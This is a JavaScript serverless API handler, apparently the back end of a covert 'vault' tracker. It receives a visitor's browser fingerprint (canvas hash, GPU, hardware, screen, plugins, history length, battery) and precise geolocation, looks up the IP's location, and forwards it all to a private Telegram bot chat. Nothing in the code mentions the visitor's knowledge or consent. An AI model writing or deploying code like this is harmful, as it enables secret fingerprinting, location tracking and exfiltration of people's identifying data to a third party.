export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return res.status(200).json({ status: 'skipped' });

  const d = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '?';

  // Follow-up message (battery + geo)
  if (d.trigger?.includes('::followup')) {
    const text = [
      `📍 VAULT FOLLOWUP`,
      ``,
      `Battery: ${d.battery || '?'}`,
      `Location: ${d.geolocation || '?'}`,
      `Canvas: ${d.canvasHash || '?'}`,
      `GPU: ${d.gpu || '?'}`,
    ].join('\n');

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    } catch (_) {}
    return res.status(200).json({ status: 'ok' });
  }

  // IP geolocation lookup
  let geoStr = '?';
  try {
    const geoRes = await fetch(`https://ipapi.co/${ip.split(',')[0].trim()}/json/`);
    const g = await geoRes.json();
    if (g.latitude) geoStr = `${g.latitude}, ${g.longitude} · ${g.city}, ${g.region}, ${g.country_name}`;
  } catch (_) {}

  // Main message
  const text = [
    `🔓 VAULT TRIGGERED`,
    ``,
    `Phrase: ${d.trigger || '?'}`,
    `Time: ${d.timestamp || '?'}`,
    `IP: ${ip}`,
    `📍 Location: ${geoStr}`,
    ``,
    `── SYSTEM ──`,
    `UA: ${d.userAgent || '?'}`,
    `Platform: ${d.platform || '?'} · ${d.mobile ? 'Mobile' : 'Desktop'}`,
    `Screen: ${d.screen || '?'} · ${d.pixelRatio || '?'}x · ${d.colorDepth || '?'}bit`,
    `Viewport: ${d.viewport || '?'} · ${d.orientation || '?'}`,
    `Gamut: ${d.gamut || '?'} · HDR ${d.hdr ?? '?'}`,
    ``,
    `── HARDWARE ──`,
    `CPU: ${d.cores || '?'} cores`,
    `RAM: ${d.memory || '?'}GB`,
    `GPU: ${d.gpu || '?'}`,
    `GPU Vendor: ${d.gpuVendor || '?'}`,
    `Audio: ${d.audioInfo || '?'}`,
    ``,
    `── NETWORK ──`,
    `Type: ${d.connection || '?'} · ↓${d.downlink || '?'}Mbps · ${d.rtt || '?'}ms`,
    `Save Data: ${d.saveData ?? '?'}`,
    `Referrer: ${d.referrer || 'direct'}`,
    ``,
    `── IDENTITY ──`,
    `TZ: ${d.timezone || '?'}`,
    `Lang: ${d.languages || '?'}`,
    `Touch: ${d.touchPoints ?? '?'} pts · ${d.pointer || '?'}`,
    `Dark: ${d.darkMode ?? '?'} · Motion: ${d.reducedMotion ?? '?'}`,
    `DNT: ${d.dnt || '?'} · Cookies: ${d.cookies ?? '?'}`,
    `Notif: ${d.notifPerm || '?'} · PWA: ${d.standalone ?? '?'}`,
    `Plugins: ${d.plugins ?? '?'}`,
    `Canvas: ${d.canvasHash || '?'}`,
    `History: ${d.historyLen || '?'} pages · Visits: ${d.visits || '?'}`,
  ].join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  } catch (_) {}

  res.status(200).json({ status: 'ok' });
}
